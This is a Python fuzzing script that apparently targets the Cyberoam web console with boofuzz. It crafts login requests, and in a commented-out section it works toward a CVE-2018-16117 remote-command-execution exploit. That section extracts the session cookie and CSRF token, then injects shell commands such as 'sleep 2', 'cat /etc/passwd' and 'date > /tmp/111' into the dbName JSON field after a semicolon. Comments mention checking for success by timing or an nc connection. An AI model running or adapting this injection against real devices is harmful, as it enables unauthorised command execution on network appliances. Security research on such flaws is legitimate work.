# -*- coding=utf-8 -*-
import json
import re

from boofuzz import *
import ssl
import sys
import requests
import time
import urllib.parse

from requests.packages.urllib3.exceptions import InsecureRequestWarning, InsecurePlatformWarning
import warnings

# 过滤掉InsecureRequestWarning警告
requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
requests.packages.urllib3.disable_warnings(InsecurePlatformWarning)

# 20240312 send packet ok, need optimization

warnings.filterwarnings("ignore", category=UserWarning)

# warnings.filterwarnings("ignore", category=UserWarning, module="boofuzz")  # python3 -W ignore
t = 0

kw = '200'

cookie = ""


def str2urlencode(s: str) -> str:
    url_str = urllib.parse.quote(s, safe='')
    return url_str


# # custom exception example
# class BooHttpException(Exception):
#     # custom Exception
#     pass


# Session -> post_test_case_callbacks
def resp(target, fuzz_data_logger, session, *args, **kwargs):
    print('--' * 66)
    print("____ in resp() ______")
    try:

        # session_last_send = session.last_send
        # session_last_recv = session.last_recv
        # print("~" * 66)
        # # fuzz_data_logger.log_info(session_last_send)
        # print(session_last_send.decode())
        # print("~" * 66)
        print(session.last_send.decode())
        print(f"[D] last_send: \n", session.last_send)

        # if session.last_send:
        #     print("[D] session last_send content: ", session.last_send.decode())
        # print("~" * 66)
        # if session.last_recv:
        #     print("[D] session last_recv content: ", session.last_recv.decode())
        # print("~" * 66)

        # temp comment
        resp_recv_data = target.recv()
        print(f"[D] resp_recv: \n", resp_recv_data)
        print("")
        print(f"[D] resp_recv_data:\n{resp_recv_data.decode()}")

        if resp_recv_data:
            global jsessionid
            jsessionid, content_length = extract_jsessionid(resp_recv_data.decode())
            print(f"[D] jsessionid: {jsessionid}")

            if int(content_length) == 53:
                print(f'[D] real jsessionid')
            else:
                # jsessionid = None
                print(f'[E] invalid jsessionid')

        print("+" * 66)

        # print("~" * 66)
        # fuzz_data_logger.log_info(session.last_send)
        # print("~" * 66)
        # fuzz_data_logger.log_info(session.last_recv)
        # if 'redirectionURL' in target.recv(10240).decode():
        #     fuzz_data_logger.log_check(session.last_send)


    except:
        fuzz_data_logger.log_fail("Unable to connect ...")

    print('--' * 66)


def resp2(target, fuzz_data_logger, session, *args, **kwargs):
    print('--' * 66)
    print("____ in resp() ______")
    try:

        # session_last_send = session.last_send
        # session_last_recv = session.last_recv
        # print("~" * 66)
        # # fuzz_data_logger.log_info(session_last_send)
        # print(session_last_send.decode())
        # print("~" * 66)
        print(session.last_send.decode())

        # if session.last_send:
        #     print("[D] session last_send content: ", session.last_send.decode())
        # print("~" * 66)
        # if session.last_recv:
        #     print("[D] session last_recv content: ", session.last_recv.decode())
        # print("~" * 66)

        # temp comment
        resp_recv_data = target.recv()
        print(f"[D] resp2 resp_recv: \n", resp_recv_data)
        print("")
        print(f"[D] resp2 resp_recv_data:\n{resp_recv_data.decode()}")

        # if resp_recv_data:
        #     global jsessionid
        #     jsessionid, content_length = extract_jsessionid(resp_recv_data.decode())
        #     print(f"[D] jsessionid: {jsessionid}")
        #
        #     if int(content_length) == 53:
        #         print(f'[D] real jsessionid')
        #     else:
        #         # jsessionid = None
        #         print(f'[E] invalid jsessionid')

        print("+" * 66)

        # print("~" * 66)
        # fuzz_data_logger.log_info(session.last_send)
        # print("~" * 66)
        # fuzz_data_logger.log_info(session.last_recv)
        # if 'redirectionURL' in target.recv(10240).decode():
        #     fuzz_data_logger.log_check(session.last_send)


    except:
        fuzz_data_logger.log_fail("Unable to connect ...")

    print('--' * 66)


def resp_all_testcase(target, fuzz_data_logger, session, test_case_context, *args, **kwargs):
    # example_test_case_callback
    # print(">>>> target_info: ")
    # print(target.recv())
    # print(dir(session))
    # print(session.root.id)  # 0
    # print(session.root.label)  # __ROOT_NODE__

    print("____ in resp_all_testcase() ______")

    # print(
    #     f"[D] test_case_context -> previous_message: {test_case_context.previous_message.id, test_case_context.previous_message.label}")
    #
    # # print(dir(test_case_context.current_message))
    # print(
    #     f"[D] test_case_context -> current_message: {test_case_context.current_message.id, test_case_context.current_message.label}")
    #
    # print("--------------~~~~~~~~~~~~~~")
    # print(session.last_send)

    # print(f'[D0] {test_case_context.session_variables}')
    # test_case_context.session_variables['cur_id'] = test_case_context.previous_message.id
    # test_case_context.session_variables['cur_label'] = test_case_context.previous_message.label
    # test_case_context.session_variables['cur_time'] = time.time()
    try:
        recv_data = session.last_recv
        if recv_data:
            print(recv_data)

        print('~' * 99)

    except:
        fuzz_data_logger.log_fail("Unable to connect ...")


def extract_csrf_token(text):
    # page csrf key, refresh each visit
    s = text.find('c$rFt0k3n')
    e = text[s:].find(';')
    token = text[s + 13:s + e - 1]
    return token


def extract_jsessionid(text):
    jsessionid = None
    content_length = 0

    match = re.search(r"JSESSIONID=([^;]+)", text)

    match2 = re.search(r'Content-Length:\s*(\d+)', text)

    if match:
        jsessionid = match.group(1)
        print(jsessionid)

    if match2:
        content_length = match2.group(1)
        print(content_length)

    return jsessionid, content_length


def login_web():
    if len(sys.argv) != 5:
        sys.exit(
            'usage: {} target_ip port username password'.format(sys.argv[0]))

    ip = sys.argv[1]
    port = sys.argv[2]
    username = sys.argv[3]
    password = sys.argv[4]

    ctx = ssl.create_default_context(ssl.Purpose.SERVER_AUTH)
    ctx.check_hostname = False
    ctx.verify_mode = ssl.CERT_NONE
    session = Session(target=Target(
        connection=SSLSocketConnection(host=ip, port=int(port), sslcontext=ctx, recv_timeout=15)),
        restart_threshold=1,
        post_test_case_callbacks=[resp],
        # receive_data_after_fuzz=True,
        # pre_send_callbacks=[gt],
        sleep_time=0.5
    )
    session.num_mutations(1)  # limit mutation count

    # 1 Request_login_web
    s_initialize(name='Request_login_get_cookie')  # request

    with s_block("Request-Line"):
        # s_group("Method", ['POST'])
        s_static("POST")
        s_delim(" ", name='space-1', fuzzable=False)  # fuzz
        # s_static(" ", name='space-1')  # static
        s_static("/webconsole/Controller", name='Request-URI')
        s_delim(" ", name='space-2', fuzzable=False)  # fuzz
        # s_static(" ", name='space-2')
        s_static('HTTP/1.1', name='HTTP-Version')
        s_static("\r\n", name="Request-Line-CRLF")

        s_static(f"Host: {ip}:{port}\r\n")
        s_static(f"Cookie: JSESSIONID=\r\n")  # login cookie empty is ok
        s_static("Content-Length: 191\r\n")

        s_static("Accept: text/plain, */*; q=0.01\r\n")
        s_static("Content-Type: application/x-www-form-urlencoded; charset=UTF-8\r\n")
        s_static("X-Requested-With: XMLHttpRequest\r\n")
        # s_static("Sec-Ch-Ua-Mobile: 0\r\n")
        s_static(
            "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.6261.112 Safari/537.36\r\n")
        s_static('Sec-Ch-Ua-Platform: "Windows"\r\n')

        # s_static("Sec-Ch-Ua-Platform: Windows\r\n")
        s_static(f"Origin: https://{ip}:{port}\r\n")

        s_static("Sec-Fetch-Site: same-origin\r\n")
        s_static("Sec-Fetch-Mode: cors\r\n")
        s_static("Sec-Fetch-Dest: empty\r\n")

        s_static(f"Referer: https://{ip}:{port}/webconsole/webpages/login.jsp\r\n")

        s_static("Accept-Encoding: gzip, deflate, br\r\n")
        s_static("Accept-Language: zh-CN,zh;q=0.9\r\n")
        # s_static("Priority: u=1, i\r\n")
        s_static("Connection: close\r\n")

        # s_size('body_content', fuzzable=False, output_format='ascii')

    s_static("\r\n", name="Request-CRLF")

    with s_block('body'):
        # static的密码都需要做符号化处理，不然发包的数据应该不对，1qaz2wsx%23EDC
        passwd_encode = str2urlencode(password)
        s_static(
            f"mode=151&json=%7B%22username%22%3A%22{username}%22%2C%22password%22%3A%22{passwd_encode}%22%2C%22languageid%22%3A%221%22%2C%22browser%22%3A%22Chrome_122%22%7D&__RequestType=ajax&t={int(time.time())}001&a=")
        # s_random(value="", min_length=1, max_length=1)

        s_group("ava", ['a', 'b'])

        # s_static(f"mode=151&json=%7B%22username%22%3A%22{username}%22%2C%22password%22%3A%22{passwd_encode}%22%2C%22languageid%22%3A%221%22%2C%22browser%22%3A%22Chrome_122%22%7D&__RequestType=ajax&t={int(time.time())}001")

    # session.connect(s_get('Request_login_get_cookie'), callback=resp_all_testcase)

    # 1 Request_login_web
    print(f"[D] Get cookie before Request_login_get_csrf_token: {cookie}")
    s_initialize(name='Request_login_get_csrf_token')

    with s_block("Request-Line"):
        s_group("Method", ['POST', "GET"])
        # s_static("GET", name="HTTP_method")
        # s_delim(" ", name='space-1', fuzzable=False)  # fuzz
        s_static(" ", name='space-1')
        s_static("/webconsole/webpages/index.jsp", name='Request-URI')
        s_delim(" ", name='space-2', fuzzable=False)  # fuzz
        # s_static(" ", name='space-2')
        s_static('HTTP/1.1', name='HTTP-Version')
        s_static("\r\n", name="Request-Line-CRLF")

        s_static(f"Host: {ip}:{port}\r\n")
        s_static(f"Cookie: JSESSIONID={cookie}\r\n")
        s_static('Sec-Ch-Ua-Platform: "Windows"\r\n')
        s_static('Upgrade-Insecure-Requests: 1\r\n')
        s_static(
            "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.6261.112 Safari/537.36\r\n")
        s_static("Sec-Fetch-Site: same-origin\r\n")
        s_static("Sec-Fetch-Mode: navigate\r\n")
        s_static("Sec-Fetch-Dest: document\r\n")

        s_static(f"Referer: https://{ip}:{port}/webconsole/webpages/login.jsp\r\n")
        s_static("Accept-Encoding: gzip, deflate, br\r\n")
        s_static("Accept-Language: zh-CN,zh;q=0.9\r\n")
        s_static("Priority: u=0, i\r\n")
        s_static("Connection: close\r\n")

    # todo fix 20240321 接收数据有些问题
    session.connect(s_get('Request_login_get_cookie'))
    # session.connect(s_get('Request_login_get_cookie'), s_get('Request_login_get_csrf_token'))
    # session.fuzz(max_depth=1)
    session.fuzz()
    print("-------")


#
#     # session.example_test_case_callback()
#
#     # 1.login web console
#     try:
#         r = requests.post(url='https://{}:{}/webconsole/Controller'.format(sys.argv[1], sys.argv[2]),
#                           data='mode=151&json=%7B%22username%22%3A%22{}%22%2C%22password%22%3A%22{}%22%2C%22languageid%22%3A%221%22%2C%22browser%22%3A%22Firefox_87%22%7D&__RequestType=ajax&t='.format(
#                               sys.argv[3], sys.argv[4]) + str(int(time.time()) + 3600) + '999', verify=False,
#                           headers={'User-Agent': 'Mozilla/5.0', 'Accept': 'application/json, text/javascript, */*',
#                                    'Accept-Language': 'en-US,en;q=0.5', 'Accept-Encoding': 'gzip, deflate',
#                                    'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
#                                    'X-Requested-With': 'XMLHttpRequest'})
#
#         # get cookie and jsessionid
#         c = r.cookies.items()[0][1]
#
#         print(f"[D] JSESSIONID is: {c}")
#
#         # get csrf_token
#         url0 = 'https://{}:{}/webconsole/webpages/index.jsp'.format(sys.argv[1], sys.argv[2])
#         r = requests.get(url=url0, headers={
#             'User-Agent': 'Mozilla/5.0', 'Accept': 'application/json, text/javascript, */*',
#             'Accept-Language': 'en-US,en;q=0.5', 'Accept-Encoding': 'gzip, deflate',
#             'Cookie': 'JSESSIONID={}'.format(c)}, verify=False)
#
#         token = extract_csrf_token(r.text)
#
#         print(f"[D] csrf token is: {token}")
#
#         print("[D] response header: ", r.headers)
#         # print(f"[D] response data: {r.text}")  # debug
#
#         if 'Cyberoam.loginUserName = "admin"' in r.text:
#             print(f"[I] Login web console success...")
#
#             # test pass 确实要24小时才过期
#
#             # CVE-2018-16117 todo dev
#             # ref: https://www.anquanke.com/post/id/214424
#
#             s_initialize(name='rce_fuzz')
#
#             with s_block("Request-Line"):
#                 # s_static(
#                 #     'POST ' + '/webconsole/Controller' + ' HTTP/1.1\r\nHost: {}:{}\r\n'.format(sys.argv[1], sys.argv[2]))
#
#                 s_group("Method", ['POST'])
#                 s_delim(" ", name='space-1', fuzzable=False)  # fuzz
#                 # s_static(" ", name='space-1')  # static
#                 s_static("/webconsole/Controller", name='Request-URI')
#                 s_delim(" ", name='space-2', fuzzable=False)  # fuzz
#                 # s_static(" ", name='space-2')
#                 s_static('HTTP/1.1', name='HTTP-Version')
#                 s_static("\r\n", name="Request-Line-CRLF")
#
#                 s_static(f"Host: {sys.argv[1]}:{sys.argv[2]}\r\n")
#                 s_static(f"Cookie: JSESSIONID={c}\r\n")
#                 s_static(
#                     "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:123.0) Gecko/20100101 Firefox/123.0\r\n")
#                 s_static("Accept: text/plain, */*; q=0.01\r\n")
#                 s_static("Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2\r\n")
#                 s_static("Accept-Encoding: gzip, deflate, br\r\n")
#                 s_static("Content-Type: application/x-www-form-urlencoded; charset=UTF-8\r\n")
#                 s_static("X-Requested-With: XMLHttpRequest\r\n")
#                 s_static(f"X-Csrf-Token: {token}\r\n")
#                 s_static("Content-Length: 308\r\n")
#                 s_static(f"Origin: https://{sys.argv[1]}:{sys.argv[2]}\r\n")
#                 s_static(
#                     f"Referer: https://{sys.argv[1]}:{sys.argv[2]}/webconsole/webpages/logging/EventViewer.jsp?selectedTab=log_viewer&csrf={token}\r\n")
#                 s_static("Sec-Fetch-Dest: empty\r\n")
#                 s_static("Sec-Fetch-Mode: cors\r\n")
#                 s_static("Sec-Fetch-Site: same-origin\r\n")
#                 s_static("Te: trailers\r\n")
#                 s_static("Connection: close\r\n")
#
#                 # s_size('body_content', fuzzable=False, output_format='ascii')
#
#             s_static("\r\n", name="Request-CRLF")
#
#             with s_block('body_content'):
#                 s_static(
#                     "mode=5001&json=%7B%22mode%22%3A5001%2C%22filter%22%3A%7B%7D%2C%22clientLimit%22%3A100%2C%22clientOffset%22%3A0%2C%22limit%22%3A100%2C%22offset%22%3A0%2C%22isLive%22%3Atrue%2C%22dbName%22%3A%22%aaa%3B")
#                 # s_static('sleep%205')  # o1
#                 s_string('sleep%202')
#                 # s_static('cat%20%2Fetc%2Fpasswd%20%2Ftmp')
#                 # s_static('date%20%3E%20%2Ftmp%2F111')
#                 s_static(
#                     f"%22%2C%22rowid%22%3A%22%22%2C%22module%22%3A%5B%22system%22%5D%7D&__RequestType=ajax&t={int(time.time())}990&a=")
#                 # s_random(min_length=1, max_length=1)  # just add for launch fuzzer
#
#             session.connect(s_get('rce_fuzz'))
#             session.fuzz(max_depth=1)
#             print("-------")
#
#             # # start_time
#             # st = time.time()
#             #
#             # r = requests.post(url=url3, verify=False,
#             #                   data=data, headers=headers)
#             #
#             # print("[I] step3 response: ", r.text)
#             #
#             # # computed expired time
#             # delta_t = time.time() - st
#             # print(f"[D] wait time: {delta_t} seconds")
#             #
#             # if cmd_type == 1:
#             #     if delta_t >= fuzz_time_value:
#             #         print("[I] sleep command, RCE success ...")
#             # elif cmd_type == 2:
#             #     print("[I] please check nc connection ...")
#
#     except Exception as e:
#         print(e)


if __name__ == '__main__':
    login_web()
